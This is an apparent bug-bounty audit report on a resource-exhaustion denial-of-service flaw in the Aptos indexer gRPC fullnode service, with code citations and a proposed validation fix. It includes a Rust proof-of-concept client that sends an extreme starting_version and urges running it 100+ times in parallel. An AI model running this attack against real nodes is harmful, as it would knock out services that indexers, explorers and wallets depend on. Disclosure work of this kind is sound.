# Audit Report

## Title
Resource Exhaustion DoS via Unbounded Waiting Loop in Indexer gRPC Fullnode Service

## Summary
The `indexer-grpc-fullnode` service accepts `GetTransactionsFromNodeRequest` with user-controlled `starting_version` values without validation. When a malicious client provides an extremely high `starting_version` (e.g., `u64::MAX - 1000`), the server spawns a task that enters an infinite waiting loop, consuming server resources indefinitely. An attacker can send multiple such requests to exhaust tokio task slots, memory, and CPU, causing service degradation or unavailability.

## Finding Description
At lines 107-110 in the backfiller's `processor.rs`, a `GetTransactionsFromNodeRequest` is constructed with user-provided values: [1](#0-0) 

The `starting_version` and `transactions_count` parameters are passed directly without validation against the current ledger state.

On the server side, when this request is received in `fullnode_data_service.rs`, the service calculates an `ending_version` using saturating arithmetic: [2](#0-1) 

A tokio task is spawned to handle the request: [3](#0-2) 

The critical vulnerability occurs in the `IndexerStreamCoordinator::ensure_highest_known_version()` method, which is called during batch fetching: [4](#0-3) 

When `current_version > highest_known_version` (line 552), the loop continues indefinitely, sleeping 100ms between iterations. If an attacker provides `starting_version = u64::MAX - 1000` when the actual ledger is at version 1,000,000, the condition will always be true, causing an infinite loop.

**Attack Flow:**
1. Attacker sends `GetTransactionsFromNodeRequest` with `starting_version = u64::MAX - 1000`
2. Server spawns a tokio task that initializes an `IndexerStreamCoordinator` with `current_version = u64::MAX - 1000`
3. When processing begins, `fetch_transactions_from_storage()` is called, which calls `get_batches()`
4. `get_batches()` calls `ensure_highest_known_version()` at line 294: [5](#0-4) 

5. The loop condition `self.current_version > self.highest_known_version` evaluates to true
6. The task loops indefinitely, consuming resources
7. Client disconnection is not detected because the channel is only checked after data is sent, but the task is stuck before that point
8. The `abort_handle` is never set to true, providing no exit mechanism
9. Attacker can repeat with multiple connections to amplify the attack

The server has no authentication mechanism and no rate limiting: [6](#0-5) 

## Impact Explanation
This vulnerability causes **service availability degradation or complete denial of service** through resource exhaustion. Per the Aptos Bug Bounty severity categories, this qualifies as **High Severity** ("API crashes" and "Validator node slowdowns").

**Specific impacts:**
1. **Tokio Runtime Exhaustion**: Each malicious request spawns a task that never completes, consuming task slots in the tokio runtime
2. **Memory Consumption**: Each stuck task maintains its state, consuming heap memory
3. **CPU Waste**: Each task wakes up every 100ms to check conditions, consuming CPU cycles
4. **Service Unavailability**: With sufficient malicious requests, legitimate indexer clients cannot connect or receive data
5. **Cascading Failures**: Indexer unavailability affects downstream services (explorers, analytics platforms, wallets)

The indexer-grpc-fullnode service is critical infrastructure for the Aptos ecosystem, providing transaction data to indexers, block explorers, and analytics platforms.

## Likelihood Explanation
**Likelihood: High**

1. **No Authentication Required**: The service has no authentication mechanism, accepting connections from any network peer [7](#0-6) 

2. **Trivial Exploitation**: Attack requires a single gRPC call with a high `starting_version` value
3. **No Rate Limiting**: No limits on concurrent connections or request rates
4. **Network Accessibility**: While intended as internal infrastructure, these services are often exposed for indexer consumption
5. **Amplification**: Attacker can open multiple connections and send multiple requests to amplify impact

## Recommendation
Implement validation of `starting_version` before entering the waiting loop:

**Recommended Fix:**

```rust
async fn get_transactions_from_node(
    &self,
    req: Request<GetTransactionsFromNodeRequest>,
) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
    let r = req.into_inner();
    let starting_version = match r.starting_version {
        Some(version) => version,
        None => return Err(Status::invalid_argument("Starting version must be set")),
    };
    
    // NEW: Validate starting_version against current ledger state
    let context = self.service_context.context.clone();
    let highest_known_version = context
        .get_latest_ledger_info()
        .map(|info| info.ledger_version.0)
        .unwrap_or(0);
    
    // Reject requests that are too far in the future (e.g., more than 1000 versions ahead)
    const MAX_FUTURE_VERSION_TOLERANCE: u64 = 1000;
    if starting_version > highest_known_version + MAX_FUTURE_VERSION_TOLERANCE {
        return Err(Status::invalid_argument(format!(
            "Starting version {} is too far ahead of current ledger version {}",
            starting_version, highest_known_version
        )));
    }
    
    // ... rest of the function
}
```

**Additional Recommendations:**
1. Add a timeout to the `ensure_highest_known_version()` loop (e.g., 60 seconds)
2. Implement connection-level rate limiting
3. Add authentication/authorization for production deployments
4. Monitor and alert on stuck tasks or excessive waiting

## Proof of Concept

```rust
// PoC: Rust client that triggers the DoS
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient, GetTransactionsFromNodeRequest,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to the indexer-grpc-fullnode service
    let mut client = FullnodeDataClient::connect("http://localhost:50051").await?;
    
    // Attack: Request transactions starting from an impossibly high version
    let malicious_request = GetTransactionsFromNodeRequest {
        starting_version: Some(u64::MAX - 1000),
        transactions_count: Some(1000),
    };
    
    println!("Sending malicious request with starting_version = {}", u64::MAX - 1000);
    
    // This will cause the server to spawn a task that loops indefinitely
    let mut stream = client
        .get_transactions_from_node(Request::new(malicious_request))
        .await?
        .into_inner();
    
    // The stream will hang here indefinitely, and the server task will never exit
    // To amplify the attack, spawn multiple such requests in parallel
    println!("Request sent. Server task is now stuck in infinite waiting loop.");
    println!("Repeat this 100+ times in parallel to exhaust server resources.");
    
    // Keep connection alive to prevent abort signal
    tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
    
    Ok(())
}
```

**To verify the vulnerability:**
1. Deploy an `indexer-grpc-fullnode` service
2. Run the PoC client multiple times in parallel (e.g., 100 instances)
3. Monitor server resources (tokio task count, memory usage, CPU)
4. Observe that spawned tasks never complete and continue consuming resources
5. Attempt to connect with a legitimate indexer client and observe degraded performance or connection failures

## Notes
This vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The waiting loop has no timeout or resource limit, allowing unbounded resource consumption. While the security question classifies this as "Low" severity, the actual impact meets **High Severity** criteria per the Aptos Bug Bounty program due to potential API crashes and service unavailability.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-file-store-backfiller/src/processor.rs (L107-110)
```rust
        let request = tonic::Request::new(GetTransactionsFromNodeRequest {
            starting_version: Some(expected_starting_version),
            transactions_count,
        });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L67-78)
```rust
    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Gets configs for the stream, partly from the request and partly from the node config
        let r = req.into_inner();
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L83-87)
```rust
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L101-117)
```rust
        tokio::spawn(async move {
            // Initialize the coordinator that tracks starting version and processes transactions
            let mut coordinator = IndexerStreamCoordinator::new(
                context,
                starting_version,
                ending_version,
                processor_task_count,
                processor_batch_size,
                output_batch_size,
                tx.clone(),
                // For now the request for this interface doesn't include a txn filter
                // because it is only used for the txn stream filestore worker, which
                // needs every transaction. Later we may add support for txn filtering
                // to this interface too.
                None,
                Some(abort_handle.clone()),
            );
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L293-296)
```rust
    async fn get_batches(&mut self) -> Vec<TransactionBatchInfo> {
        if !self.ensure_highest_known_version().await {
            return vec![];
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L550-577)
```rust
    async fn ensure_highest_known_version(&mut self) -> bool {
        let mut empty_loops = 0;
        while self.highest_known_version == 0 || self.current_version > self.highest_known_version {
            if let Some(abort_handle) = self.abort_handle.as_ref() {
                if abort_handle.load(Ordering::SeqCst) {
                    return false;
                }
            }
            if empty_loops > 0 {
                tokio::time::sleep(Duration::from_millis(RETRY_TIME_MILLIS)).await;
            }
            empty_loops += 1;
            if let Err(err) = self.set_highest_known_version() {
                error!(
                    error = format!("{:?}", err),
                    "[Indexer Fullnode] Failed to set highest known version"
                );
                continue;
            } else {
                sample!(
                    SampleRate::Frequency(10),
                    info!(
                        highest_known_version = self.highest_known_version,
                        "[Indexer Fullnode] Found new highest known version",
                    )
                );
            }
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-112)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);

        let router = match use_data_service_interface {
            false => {
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
```
